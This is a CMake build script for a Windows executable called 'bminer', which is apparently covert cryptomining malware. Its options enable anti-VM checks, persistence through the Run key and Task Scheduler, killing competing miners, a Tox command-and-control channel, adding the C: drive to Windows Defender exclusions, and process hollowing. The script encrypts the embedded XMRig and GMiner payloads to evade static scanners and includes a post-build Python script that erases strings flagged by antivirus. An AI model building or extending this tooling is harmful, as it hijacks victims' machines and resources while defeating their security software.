cmake_minimum_required(VERSION 3.10)
project(bminer)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Link MSVC runtime statically
if(MSVC)
    foreach(flag_var CMAKE_CXX_FLAGS CMAKE_CXX_FLAGS_DEBUG CMAKE_CXX_FLAGS_RELEASE CMAKE_CXX_FLAGS_MINSIZEREL CMAKE_CXX_FLAGS_RELWITHDEBINFO)
        if(${flag_var} MATCHES "/MD")
            string(REGEX REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
        endif()
        if(${flag_var} MATCHES "/MDd")
            string(REGEX REPLACE "/MDd" "/MTd" ${flag_var} "${${flag_var}}")
        endif()
    endforeach()
endif()

add_definitions(-DUNICODE -D_UNICODE)
add_definitions(-D_WIN32_WINNT=0x0601)

# Optional Debug Console feature
option(ENABLE_DEBUG_CONSOLE "Enable debug console output" OFF)
if(ENABLE_DEBUG_CONSOLE)
    message(STATUS "Debug console enabled")
    add_definitions(-DENABLE_DEBUG_CONSOLE)
endif()

# Optional Anti-VM feature
option(ENABLE_ANTIVM "Enable Anti-VM detection" OFF)

# Optional Persistence feature
option(ENABLE_PERSISTENCE "Enable persistence via Run key" OFF)

# Optional Foreign Miner Killer feature
option(ENABLE_FOREIGN_MINER_KILLER "Kill non-Bminer miners" OFF)

# Optional Tox C2 channel
option(ENABLE_TOX_C2 "Enable the Tox C2 channel" OFF)

# Optional Admin Manifest feature
option(ENABLE_ADMIN_MANIFEST "Require administrator privileges" OFF)
if(ENABLE_ADMIN_MANIFEST)
    message(STATUS "Admin manifest enabled - executable will require administrator privileges")
    add_definitions(-DENABLE_ADMIN_MANIFEST)
endif()

# Optional Windows Defender Exclusion feature
option(ENABLE_DEFENDER_EXCLUSION "Add C: drive to Windows Defender exclusion" OFF)
if(ENABLE_DEFENDER_EXCLUSION)
    message(STATUS "Windows Defender exclusion enabled - will add C: drive to exclusion list")
    add_definitions(-DENABLE_DEFENDER_EXCLUSION)
endif()

# Remote-miner download option was removed for security (unverified PE
# download + hollowing = trivial hijack if the panel URL was ever lost).
# Any -DENABLE_REMOTE_MINERS=ON passed by an older builder is silently
# ignored: the code path no longer exists.

# How the client receives updated mining config: endpoint | tox | config_link
set(CONFIG_UPDATE_MODE "endpoint" CACHE STRING "Config update channel: endpoint, tox or config_link")
if(CONFIG_UPDATE_MODE STREQUAL "tox" AND NOT ENABLE_TOX_C2)
    message(FATAL_ERROR "CONFIG_UPDATE_MODE=tox without ENABLE_TOX_C2: the client would boot the stale "
                        "embedded config and ignore every operator push. Build with a Tox identity (builder "
                        "passes -DENABLE_TOX_C2=ON) or pick another mode.")
endif()
add_definitions(-DCONFIG_UPDATE_MODE="${CONFIG_UPDATE_MODE}")
message(STATUS "Config update mode: ${CONFIG_UPDATE_MODE}")

# Generate embedded config header from JSON
include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedConfig.cmake)
include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedToxConfig.cmake)

# ENABLE_EMBEDDED_CONFIG can be passed explicitly by the builder; if not set,
# auto-detect based on whether a JSON file is available.
option(ENABLE_EMBEDDED_CONFIG "Embed fallback config JSON in the executable" OFF)

# Accept config path from builder, with fallback to client resources
if(NOT DEFINED EMBEDDED_CONFIG_JSON_INPUT)
    set(EMBEDDED_CONFIG_JSON_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded_config.json")
endif()

set(EMBEDDED_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/embedded_config_generated.h")

# Decide whether to embed: either explicit flag or auto-detect from file presence
if(ENABLE_EMBEDDED_CONFIG OR EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
    if(EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
        message(STATUS "Embedded config file found - generating header")
        message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
        generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
        add_definitions(-DENABLE_EMBEDDED_CONFIG)
    else()
        message(WARNING "ENABLE_EMBEDDED_CONFIG=ON but no JSON file found at: ${EMBEDDED_CONFIG_JSON_INPUT}")
    endif()
else()
    message(STATUS "Embedded config not enabled - relying on panel/GET URL at runtime")
endif()

# Embedded Tox config (operator + bot identities), written by the builder.
set(TOX_CONFIG_INPUT "" CACHE STRING "Path to tox_config.json to embed")
if(NOT DEFINED TOX_CONFIG_INPUT)
    set(TOX_CONFIG_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/tox_config.json")
endif()
set(TOX_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/tox_config_generated.h")
if(ENABLE_TOX_C2 AND EXISTS "${TOX_CONFIG_INPUT}")
    generate_embedded_tox_config("${TOX_CONFIG_INPUT}" "${TOX_CONFIG_HEADER}")
    add_definitions(-DENABLE_TOX_CONFIG)
    message(STATUS "Embedded tox config from: ${TOX_CONFIG_INPUT}")
elseif(ENABLE_TOX_C2)
    message(STATUS "Tox C2 enabled but no tox_config.json found - operator ID comes from id_tox")
endif()

# Source files
set(SRC_FILES
    src/main.cpp
    src/util.cpp
    src/pe_hdrs_helper.cpp
    src/hollowing_parts.cpp
    src/delete_pending_file.cpp
    src/http_client.cpp
    src/json_printer.cpp
    src/process_info.cpp
    src/config_manager.cpp
    src/dvm_stub.cpp
    src/antidebug_stub.cpp
    # Anchor points for BVM. Every symbol here is dllexport'd so the
    # protector can find the functions we want virtualized by walking
    # the EXE's export table (see CryptPage::resolvePresetRvas).
    src/exports_thunks.cpp
)

# Resource files: miners are always embedded (the remote-download path was
# removed for security). Default to CPU miner when neither flag is set.
if(NOT DEFINED ENABLE_CPU_MINER)
    set(ENABLE_CPU_MINER ON)
endif()
if(NOT DEFINED ENABLE_GPU_MINER)
    set(ENABLE_GPU_MINER OFF)
endif()

# Generate RC file if any miners are being embedded
if(ENABLE_CPU_MINER OR ENABLE_GPU_MINER)
    set(GENERATED_RC "${CMAKE_CURRENT_BINARY_DIR}/embedded_resource_generated.rc")
    set(RC_CONTENT "#include \"../include/resources.h\"\n")

    # Embedded miner payloads are encrypted at build time (payload_encryptor +
    # payload_crypto.h) so the resource section never carries the raw PE bytes,
    # which static scanners match verbatim. The runtime loader replays the same
    # keystream in LoadEmbeddedXMRig/LoadEmbeddedGminer before use.
    add_executable(payload_encryptor EXCLUDE_FROM_ALL tools/payload_encryptor.cpp)
    set(ENCRYPTED_PAYLOADS)

    if(ENABLE_CPU_MINER)
        set(XMRIG_ENC "${CMAKE_CURRENT_BINARY_DIR}/xmrig_enc.bin")
        add_custom_command(
            OUTPUT "${XMRIG_ENC}"
            COMMAND $<TARGET_FILE:payload_encryptor>
                    "${CMAKE_CURRENT_SOURCE_DIR}/resources/xmrig.exe"
                    "${XMRIG_ENC}"
            DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/resources/xmrig.exe"
                    payload_encryptor
            COMMENT "Encrypting CPU miner payload for embedding"
        )
        list(APPEND ENCRYPTED_PAYLOADS "${XMRIG_ENC}")
        string(APPEND RC_CONTENT "EMBEDDED_XMRIG RCDATA \"${XMRIG_ENC}\"\n")
        message(STATUS "Embedding CPU miner (encrypted) in resources")
        add_definitions(-DENABLE_CPU_MINER)
    endif()

    if(ENABLE_GPU_MINER)
        set(GMINER_ENC "${CMAKE_CURRENT_BINARY_DIR}/gminer_enc.bin")
        add_custom_command(
            OUTPUT "${GMINER_ENC}"
            COMMAND $<TARGET_FILE:payload_encryptor>
                    "${CMAKE_CURRENT_SOURCE_DIR}/resources/gminer.exe"
                    "${GMINER_ENC}"
            DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/resources/gminer.exe"
                    payload_encryptor
            COMMENT "Encrypting GPU miner payload for embedding"
        )
        list(APPEND ENCRYPTED_PAYLOADS "${GMINER_ENC}")
        string(APPEND RC_CONTENT "EMBEDDED_GMINER RCDATA \"${GMINER_ENC}\"\n")
        message(STATUS "Embedding GPU miner (encrypted) in resources")
        add_definitions(-DENABLE_GPU_MINER)
    endif()

    file(WRITE "${GENERATED_RC}" "${RC_CONTENT}")
    set(RESOURCE_FILES "${GENERATED_RC}")

    message(STATUS "Embedding miner resources in executable")
else()
    set(RESOURCE_FILES)
    message(WARNING "No miners enabled - at least one miner should be enabled")
endif()

# The bminer target must not start compiling until the encrypted payload blobs
# (and the encryptor tool) exist, otherwise windres would embed a missing file.
if(ENCRYPTED_PAYLOADS)
    add_custom_target(encrypted_payloads ALL DEPENDS ${ENCRYPTED_PAYLOADS})
endif()

# Admin manifest (UAC requireAdministrator). MSVC uses linker flags (below);
# MinGW embeds a manifest resource compiled by windres.
if(ENABLE_ADMIN_MANIFEST AND NOT MSVC)
    file(WRITE "${CMAKE_CURRENT_BINARY_DIR}/admin_manifest.rc"
        "1 24 \"${CMAKE_CURRENT_SOURCE_DIR}/resources/admin_manifest.xml\"\n")
    list(APPEND RESOURCE_FILES "${CMAKE_CURRENT_BINARY_DIR}/admin_manifest.rc")
endif()

# Header files
set(HEADER_FILES
    include/util.h
    include/kernel32_undoc.h
    include/ntddk.h
    include/pe_hdrs_helper.h
    include/hollowing_parts.h
    include/delete_pending_file.h
    include/http_client.h
    include/json_printer.h
    include/json.hpp
    include/process_info.h
    include/config_manager.h
    include/dvm_str.h
    include/dvm_string.h
)

# Add Anti-VM files if enabled
if(ENABLE_ANTIVM)
    message(STATUS "Anti-VM detection enabled")
    add_definitions(-DENABLE_ANTIVM)
    list(APPEND SRC_FILES src/antivm.cpp)
    list(APPEND HEADER_FILES include/antivm.h)
endif()

# Add Persistence files if enabled
if(ENABLE_PERSISTENCE)
    message(STATUS "Persistence enabled")
    add_definitions(-DENABLE_PERSISTENCE)
    list(APPEND SRC_FILES src/persistence.cpp)
    list(APPEND HEADER_FILES include/persistence.h)
endif()

# Add Foreign Miner Killer files if enabled
if(ENABLE_FOREIGN_MINER_KILLER)
    message(STATUS "Foreign Miner Killer enabled")
    add_definitions(-DENABLE_FOREIGN_MINER_KILLER)
    list(APPEND SRC_FILES src/foreign_miner_killer.cpp)
    list(APPEND HEADER_FILES include/foreign_miner_killer.h)
endif()

# Add Tox C2 files if enabled
if(ENABLE_TOX_C2)
    message(STATUS "Tox C2 enabled")
    add_definitions(-DENABLE_TOX_C2)
    list(APPEND SRC_FILES src/tox_c2.cpp)
    list(APPEND SRC_FILES src/sodium_shim.c)
    list(APPEND HEADER_FILES include/tox_c2.h)
    list(APPEND HEADER_FILES include/tox_bootstrap.h)
endif()

# Miners are now embedded as resources in the executable
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
if(MSVC)
    # Enable resource compilation for MSVC
    enable_language(RC)
endif()
if(NOT MSVC)
	set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
	# Size optimization for Release builds with MinGW
	# -Os: optimize for size, -s: strip symbols, -Wl,--gc-sections: remove unused sections
	set(CMAKE_CXX_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
	set(CMAKE_C_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
endif()
set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")

# Create executable - use WIN32 subsystem unless debug console is enabled
if(ENABLE_DEBUG_CONSOLE)
    add_executable(bminer 
        ${SRC_FILES}
        ${RESOURCE_FILES}
        ${HEADER_FILES}
    )
else()
    add_executable(bminer 
        WIN32
        ${SRC_FILES}
        ${RESOURCE_FILES}
        ${HEADER_FILES}
    )
endif()

# Set linker flags for GUI subsystem (hide console)
set_target_properties(bminer PROPERTIES
    OUTPUT_NAME bminer
)

if(MSVC)
	target_compile_options(bminer PRIVATE /W0)
else()
	target_compile_options(bminer PRIVATE
		-w
		-ffunction-sections
		-fdata-sections
	)
endif()

# Link libraries. Ensure the encrypted payload blobs are produced before any
# object (including the RC compiled by windres) is built.
if(ENCRYPTED_PAYLOADS)
    add_dependencies(bminer encrypted_payloads)
endif()

if(MSVC)
	target_link_libraries(bminer
		winhttp.lib
		ntdll.lib
		wbemuuid.lib
		ole32.lib
		oleaut32.lib
		iphlpapi.lib
	)
	# Link Task Scheduler library if persistence is enabled
	if(ENABLE_PERSISTENCE)
		target_link_libraries(bminer taskschd.lib)
	endif()
else()
	# Statically link the C/C++ runtime so api-ms-win-crt-*.dll strings
	# never appear in the import table.
	# -ffunction-sections/-fdata-sections + --gc-sections eliminate dead libgcc
	# code (pseudo-reloc handler strings). --disable-runtime-pseudo-reloc
	# ensures the handler is never referenced so --gc-sections can drop it.
	target_link_options(bminer PRIVATE
		-static-libgcc
		-static-libstdc++
		-static
		-Wl,--gc-sections
		-Wl,--disable-runtime-pseudo-reloc
		# BVM anchors: exports_thunks.cpp marks its symbols dllexport, and
		# MinGW ld emits an export directory when any symbol is exported.
		# --exclude-all-symbols would strip the dllexport'd ones too, so
		# it is deliberately NOT passed here. `-s` strips debug symbols
		# but leaves the PE export directory intact.
		# Emit a linker map so symbol names can be collected/renamed, then the
		# map is excluded from the protected build.
		-Wl,-Map=${CMAKE_BINARY_DIR}/bminer.map
	)
	target_link_libraries(bminer
		-lwinhttp
		-lntdll
		-lwbemuuid
		-lole32
		-loleaut32
		-liphlpapi
		-luuid
		-luserenv
	)
	# Link Task Scheduler library if persistence is enabled
	if(ENABLE_PERSISTENCE)
		# Try to link taskschd, fallback to mstask if needed
		target_link_libraries(bminer -ltaskschd)
	endif()
endif()

# Tox C2 channel: link the vendored static toxcore + libsodium.
if(ENABLE_TOX_C2)
	set(TOX_THIRDPARTY "${CMAKE_CURRENT_SOURCE_DIR}/ThirdParty/toxcore")
	find_library(TOXCORE_LIB NAMES toxcore PATHS "${TOX_THIRDPARTY}/lib" NO_DEFAULT_PATH)
	find_library(SODIUM_LIB  NAMES sodium libsodium PATHS "${TOX_THIRDPARTY}/lib" NO_DEFAULT_PATH)
	if(TOXCORE_LIB AND SODIUM_LIB)
		target_include_directories(bminer PRIVATE "${TOX_THIRDPARTY}/include")
		if(MSVC)
			target_link_libraries(bminer ${TOXCORE_LIB} ${SODIUM_LIB} ws2_32.lib iphlpapi.lib)
		else()
			target_link_libraries(bminer ${TOXCORE_LIB} ${SODIUM_LIB} -lws2_32 -liphlpapi -lpthread)
		endif()
	else()
		message(FATAL_ERROR "ENABLE_TOX_C2=ON but libtoxcore/libsodium not found in ${TOX_THIRDPARTY}/lib")
	endif()
endif()

# toxcli helper: generates Tox identities and sends C2 messages on the
# builder's behalf. Kept in the same project so it shares the client's
# toolchain and vendored libs (the Qt builder never links toxcore itself).
option(BUILD_TOXCLI "Build the toxcli helper tool" ON)
if(BUILD_TOXCLI)
	set(TOX_THIRDPARTY "${CMAKE_CURRENT_SOURCE_DIR}/ThirdParty/toxcore")
	find_library(TOXCORE_LIB NAMES toxcore PATHS "${TOX_THIRDPARTY}/lib" NO_DEFAULT_PATH)
	find_library(SODIUM_LIB  NAMES sodium libsodium PATHS "${TOX_THIRDPARTY}/lib" NO_DEFAULT_PATH)
	if(TOXCORE_LIB AND SODIUM_LIB)
		# EXCLUDE_FROM_ALL: the helper is only built explicitly (--target toxcli)
		# by the builder. Keeping it out of `all` avoids the bminer POST_BUILD
		# (which deletes CMakeFiles/Makefile) racing with toxcli's build.
		add_executable(toxcli EXCLUDE_FROM_ALL src/toxcli.cpp src/sodium_shim.c)
		target_include_directories(toxcli PRIVATE "${TOX_THIRDPARTY}/include")
		if(MSVC)
			target_link_libraries(toxcli ${TOXCORE_LIB} ${SODIUM_LIB} ws2_32.lib iphlpapi.lib)
		else()
			target_link_libraries(toxcli ${TOXCORE_LIB} ${SODIUM_LIB} -lws2_32 -liphlpapi -lpthread)
			target_link_options(toxcli PRIVATE -static-libgcc -static-libstdc++ -static)
		endif()
		message(STATUS "toxcli helper target added")
	else()
		message(STATUS "toxcore libs not found - toxcli helper will not be built")
	endif()
endif()

# Add admin manifest if enabled
if(ENABLE_ADMIN_MANIFEST)
	if(MSVC)
		set_target_properties(bminer PROPERTIES
			LINK_FLAGS "${LINK_FLAGS} /MANIFESTUAC:\"level=requireAdministrator uiAccess=false\""
		)
	endif()
endif()

# Include directories
target_include_directories(bminer PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_BINARY_DIR}/generated
)

# Installation
install(TARGETS bminer
    DESTINATION ${CMAKE_INSTALL_PREFIX}
    COMPONENT bminer
)

add_custom_command(TARGET bminer POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E remove_directory ${CMAKE_BINARY_DIR}/CMakeFiles
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/CMakeCache.txt
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/cmake_install.cmake
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/Makefile
    COMMENT "Auto-removing CMake-generated files"
)

# Post-build: patch MinGW pseudo-reloc error strings that trigger AV signatures.
# These strings live in libgcc.a and cannot be removed via --gc-sections because
# crtbegin.o always keeps a live reference to the handler.  Zeroing them in the
# linked PE is reliable and has no runtime impact (the handler only uses them
# before abort(), and --disable-runtime-pseudo-reloc prevents it being called).
if(NOT MSVC)
    # NOTE: this is a *cosmetic* patch that zeroes MinGW pseudo-reloc runtime
    # strings so `strings bminer.exe` doesn't leak them. It is NOT required for
    # correctness — --disable-runtime-pseudo-reloc already prevents the handler
    # from running. So on any failure (Defender holding an on-access read lock,
    # AV scanner, indexer) we retry a few times and then exit 0 with a warning.
    # A non-zero exit would make mingw32-make delete the freshly-linked exe.
    file(WRITE "${CMAKE_BINARY_DIR}/patch_pseudoreloc.py"
"import sys, os, time

path = sys.argv[1]

targets = [
    b'Mingw-w64 runtime failure:\\n',
    b'Address %p has no image-section',
    b'  VirtualQuery failed for %d bytes at address %p',
    b'  VirtualProtect failed with code 0x%x',
    b'  Unknown pseudo relocation protocol version %d',
    b', %g)  (retval=%g)\\n',
]

# Retry-on-lock: Defender / AV / indexers briefly hold read locks on a
# freshly-linked PE. Wait a total of ~5s before giving up.
data = None
last_err = None
for attempt in range(20):
    try:
        with open(path, 'rb') as f:
            data = bytearray(f.read())
        break
    except (PermissionError, OSError) as e:
        last_err = e
        time.sleep(0.25)

if data is None:
    print('[patch] WARNING: could not read', path, '(', last_err, ') — skipping pseudo-reloc patch (cosmetic only)')
    sys.exit(0)

patched = 0
for t in targets:
    idx = data.find(t)
    while idx != -1:
        for i in range(idx, idx + len(t)):
            data[i] = 0x00
        patched += 1
        idx = data.find(t, idx + 1)

# Write-back with the same retry policy — the file may still be locked.
last_err = None
for attempt in range(20):
    try:
        with open(path, 'wb') as f:
            f.write(bytes(data))
        print('[patch] Zeroed', patched, 'pseudo-reloc string(s) in', path)
        sys.exit(0)
    except (PermissionError, OSError) as e:
        last_err = e
        time.sleep(0.25)

print('[patch] WARNING: could not write', path, '(', last_err, ') — skipping pseudo-reloc patch (cosmetic only)')
sys.exit(0)
")
    find_program(PYTHON_EXE NAMES python3 python py)
    if(PYTHON_EXE)
        add_custom_command(TARGET bminer POST_BUILD
            COMMAND ${PYTHON_EXE} "${CMAKE_BINARY_DIR}/patch_pseudoreloc.py" $<TARGET_FILE:bminer>
            COMMENT "Patching MinGW pseudo-reloc strings in binary"
        )
    else()
        message(WARNING "Python not found -- MinGW pseudo-reloc strings will NOT be patched")
    endif()
endif()

message(STATUS "Project configured for build")
